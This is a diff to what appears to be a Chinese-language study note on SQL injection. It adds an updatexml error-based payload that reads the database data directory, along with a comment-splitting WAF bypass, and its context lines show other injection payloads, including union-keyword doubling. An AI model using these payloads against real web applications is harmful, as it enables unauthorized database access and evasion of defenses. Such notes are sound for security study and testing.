@@ -337,10 +337,16 @@ select updatexml(1,concat(0x7e,(SELECT @@version)),1);
 ```bash
 ?id=2' and updatexml(1,concat(0x7e,(SELECT @@version)),1) -- '
 ```
+
 - `updatexml(xml_target, xpath_expression, new_xml)` 这是一个 **MySQL** 用于修改 **XML** 数据的内置函数。它接收三个参数：
   - `xml_target`：目标 **XML** 内容或文档。
   - `xpath_expression`：用于定位要修改的 **XML** 节点的 **XPath** 路径。
   - `new_xml`：替换后的新 **XML** 内容。
+
+*特殊绕过*
+```bash
+?id=2' and updatexml(0x1,concat_ws(1,0x7e,@@datadir),0x1) -- '
+```
 
 <span style="font-size: 19px;">**4.exp()**</span>
 
@@ -670,11 +676,17 @@ select/**/*/**/from/**/test/**/where/**/id/**/like/**/1;
 ```sql
 http://127.0.0.1:80/sqli_2.php?movie=13 ununionion select 1,user(),user(),4,5,6,7 from information_schema.tables &action=go
 ```
-<span style="font-size: 19px;">**双重编码绕过|**</span>
+<span style="font-size: 19px;">**双重编码绕过**</span>
 
 **过滤代码**: WAF：urldecode(param)->过滤
 
 <img src="./assets/双重编码绕过.png" alt="background" width="433" >
+
+<span style="font-size: 19px;">**注释符绕过**</span>
+
+```html
+a=/*&id=注入语句&b=*/
+```
 
 ### 宽字节注入
 
